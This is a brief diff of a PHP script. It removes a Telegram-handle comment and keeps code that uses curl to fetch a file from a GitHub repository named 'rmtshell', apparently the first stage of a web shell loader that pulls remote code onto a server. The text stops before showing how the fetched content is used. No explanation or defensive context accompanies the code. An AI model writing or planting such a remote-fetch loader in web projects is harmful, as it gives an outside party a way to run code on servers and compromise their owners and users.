@@ -1,5 +1,4 @@
 <?php
-#telegram @Devidluice
 $remoteUrl = "https://raw.githubusercontent.com/uidr00t/rmtshell/main/inputs.txt";
 $ch = curl_init($remoteUrl);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
